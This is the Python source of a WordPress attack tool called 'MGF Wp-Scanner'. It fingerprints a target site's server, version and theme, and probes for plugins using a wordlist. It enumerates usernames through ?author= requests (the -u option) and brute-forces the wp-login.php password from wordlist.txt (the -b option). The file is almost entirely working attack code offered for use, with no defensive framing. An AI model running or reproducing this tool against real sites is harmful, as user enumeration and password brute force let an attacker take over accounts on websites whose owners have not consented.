#!/usr/bin/python
################################################
#                                              #
#        Coded by dogo h@ck(MGF15)             #
#            MGF Wp-Scanner     ______________ #
#                              |_v2.9.1 Fixed_|#
################################################

#dev from --> http://sh3ll0nc0rp.blogspot.com/2011/11/python-wordpress-sqlrficgi-scanner.html

import sys, urllib2, re, time, httplib , os , colorama , urllib , socket 
from colorama import Fore, Back, Style , init

colorama.init()

def osfunction():
    if os.name == "posix":
        clearing = 'clear'
    else:
        clearing = 'cls'
    os.system(clearing)

def print_intro():
    print "+-----------------------------------------------+"
    print "|                                               |"
    print "|       Coded by dogo h@ck - (MGF15)            |"
    print "|            MGF Wp-Scanner       ______________|"
    print "|                                |_v2.9.1 Fixed_|"
    print "+-----------------------------------------------+"

BAD_RESP = [200,400,401,404]

def main(path):

	#Coded by d3hydr8 |-| d3hydr8[at]gmail[dot]com 
	try:
		h = httplib.HTTP(host.split("/",1)[0])
		h.putrequest("HEAD", "/"+host.split("/",1)[1]+path)
		h.putheader("Host", host.split("/",1)[0])
		h.endheaders()
		resp, reason, headers = h.getreply()
		return resp, reason, headers.get("Server")
	except(), msg: 
		print "Error Occurred:",msg
		pass

def timer():
	now = time.localtime(time.time())
	return time.asctime(now)
	
#Scanner
def scan(S,F):
	File = open(Dir + F, 'r')
	
	for line in File.read().split('\n'):
		resp,reason,server = main(S + line)
		
		if resp not in BAD_RESP:
			print (Fore.GREEN + d )
			print (Fore.GREEN + '\t' + S + line)
			Found.write(line+"\n")
d="\t[+] Found "
e="[*] Scanning: "
P='/wp-content/plugins/'
T='/wp-content/themes/'
Y = 'themes.txt'
U = 'plugins.txt'

Dir = os.path.dirname(os.path.realpath(__file__)) + os.path.sep

Found = open(Dir + 'Found.txt', 'w')
osfunction()

if len(sys.argv) != 3:
	print "\nUsage: python MGF.py <option> <site> "
	print "Ex: python MGF-Wp-Scanner.py -p http://www.site.com/\n"
	print "Option:"
	print "\t-p : to Scan Plugins"
	print "\t-u : to Get USERs"
	print "\t-b : to Bruteforce"
	sys.exit(1)

option  = sys.argv[1]

host = sys.argv[2].replace("http://","").rsplit("/",1)[0]
if host[-1] != "/":
	host = host+"/"

site = sys.argv[2].replace("http://","").rsplit("/",2)[0]

print_intro()

print (Fore.WHITE + "\n[*] Started:"),timer()
print "\n[*] Site:",sys.argv[2]

#Get Host IP
try:
	
	print (Fore.CYAN + "\n[+] Host IP:"),socket.gethostbyname(site)
    
except:
    pass
#Get Server
try :
	server = main("/")[2]
	print (Fore.YELLOW + '\n[+] Server:'),server
except:
	pass

rest = site + '/xmlrpc.php'

#Get xmlrpc
try:
	if rest not in BAD_RESP: 
		print (Fore.RED + "\n[*] X-Pingback: " + "http://" + rest)
except :

	print (Fore.RED + "\n[-] X-Pingback: " + ':(')

#Find Wordpress Version from readme.html
try :
	site = sys.argv[2]
	ret = site + '/readme.html'
	response = urllib2.urlopen(ret).read()
	M = re.findall("(</a>\n\t<br />(.*?)\n</h1>)", response) 
	for N in M:
		print (Fore.GREEN + '\n[+] This site use wordpress =>') ,N[1]
	
except:
	pass
	
# Theme in used
try:

	response = urllib2.urlopen(site).read()
	match= re.findall(r"(/wp-content/themes/.*?/)", response)

	if match :
		print (Fore.YELLOW + "\n[+] Wordpres Theme"), match[0]

	else :
		pass
except:
	pass

#Plugins Scan
if option == '-p':
	#Test Site
	print (Fore.WHITE + '\n[+] Testing Site ')
	try:
		
		t = site + '/wp-content/plugins/dogo'
		q = urllib.urlopen(t)
		h = q.read()
		test = re.findall(r'(<!DOCTYPE html>)' ,h)
		
		if test:
			print "\n[-] i can't Scan this Sh!7 plz check is \n\n" + t
			sys.exit()
		else:
			print (Fore.BLUE + "\n" + e + 'plugins')
			scan(P,U)
			Found.close()			
	except:
		r = raw_input("\n[*] Do you need to continue this 'll tack longtime(yes/no):")
		if r == 'yes':
			print (Fore.BLUE + "\n" + e + 'plugins')
			try:
				g = site + '/wp-content/plugins/'
				plugin = open(Dir + 'plugins.txt', 'r')
				for lin in plugin.read().split("\n"):
					k = g + lin
					h = urllib.urlopen(k).read()
					r = re.findall(r'<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">' ,h)
					if r:
						print (Fore.GREEN + '\n\t' + '/wp-content/plugins/' + lin)
					else:
						pass
			except:
				pass
			Found.close()
		a = open(Dir +'Found.txt','r')
		print "\n[+]",len(a.readlines()) , "Plugins Found:"
		if r == 'no':
			pass
#Get USERs
if option == '-u':
	user = open(Dir + 'Users.txt', 'w')
	print (Fore.GREEN + '\n[*] Start Get USERs')
	site = sys.argv[2]
	i = 1
	while i <= 20:
		try:
			n = site + '?author=' + str(i)
			p = urllib2.urlopen(n)
			s = p.read()
			search = re.findall(r'rel="author">(.*?)</a>', s)
			if search:
				print '\n[+] USER' , i , search
				user.write(search[0]+'\n')
			else:
				pass
		except:
			break
		i = i + 1
#Bruteforce			
if option == '-b':
	site = sys.argv[2]
	print '\n=========================================='
	print '[*] Start BruteForce'
	user=raw_input('[*] Enter username :')
	bad='<strong>ERROR</strong>'
	wordlistFile = open(Dir + 'wordlist.txt', 'r')
	for passwd in wordlistFile.read().split('\n'):
		rest = '/wp-login.php'
		pa = urllib.urlencode({'log':user,'pwd':passwd})
		req  = urllib2.Request(site+rest)
		try:
			b   = urllib2.urlopen(req, pa)
			data = b.read()
			match= re.search('(<strong>ERROR</strong>)', data)
			sys.stdout.write("\r[*] Trying %s... " % passwd)
			if match: 
				pass
			else: 
				print '\n[+] Password Found: %s' % passwd 
				sys.exit(1)
		except urllib2.URLError:  
			print '[-] Error: seems to be down'
			
out = open(Dir + 'OUT','w')
out.write(site)
print (Fore.WHITE + "\n[*] Finesh At:"),timer()
print "\n[*] Done !"
